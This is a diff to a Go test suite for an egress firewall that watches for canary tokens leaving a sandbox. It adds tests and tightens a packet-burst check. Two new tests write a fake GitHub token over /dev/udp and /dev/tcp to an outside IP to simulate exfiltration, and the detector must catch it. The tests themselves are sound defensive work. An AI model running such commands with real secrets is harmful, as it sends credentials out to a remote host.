@@ -122,6 +122,30 @@ func TestDirectUDPIsRefusedAndRecordedWithTheCanariesInIt(t *testing.T) {
 	}
 }
 
+func TestAnythingSentToPort53AtAnyAddressIsSearched(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/udp/203.0.113.9/53")
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+}
+
+func TestADirectTCPConnectionsPayloadIsSearched(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/tcp/203.0.113.9/9997")
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+}
+
 func TestDirectIPv6IsRefusedAndRecorded(t *testing.T) {
 	requireFirewall(t)
 	if fd, err := syscall.Socket(syscall.AF_INET6, syscall.SOCK_DGRAM, 0); err != nil {
@@ -250,7 +274,7 @@ func TestABurstOfLargePacketsLosesNoCanaryUnsaid(t *testing.T) {
 	upFirewall(t, e)
 
 	// 600 datagrams of 60 KB as fast as Python sends them, the token in the
-	// 300th: either it is found, or the loss is.
+	// 300th: the NFLOG buffer holds them all, so the token is found.
 	_, _ = asNobody(t, python+` -I -c '
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -262,10 +286,24 @@ for i in range(600):
     except OSError:
         pass
 '`)
-	rec.waitFor(t, func() bool {
-		found := leftAs(t, rec)
-		return hasRule(found, findings.RuleCanaryLeft) || hasRule(found, findings.RuleDirectUnrecorded)
-	})
-	t.Logf("%d direct observations; canary found: %v; loss found: %v", len(rec.of(KindConnect)),
-		hasRule(leftAs(t, rec), findings.RuleCanaryLeft), hasRule(leftAs(t, rec), findings.RuleDirectUnrecorded))
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+	if found := leftAs(t, rec); hasRule(found, findings.RuleDirectUnrecorded) {
+		t.Errorf("findings = %+v, want no packet lost", found)
+	}
+}
+
+func TestTheRefusedPacketLogHoldsABurst(t *testing.T) {
+	requireFirewall(t)
+	n, err := OpenNFLog(uint16(3000 + os.Getpid()%1000))
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = n.Close() })
+	got, err := syscall.GetsockoptInt(n.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got < nflogReceiveBuffer {
+		t.Errorf("the netlink socket's buffer is %d bytes, want at least %d", got, nflogReceiveBuffer)
+	}
 }
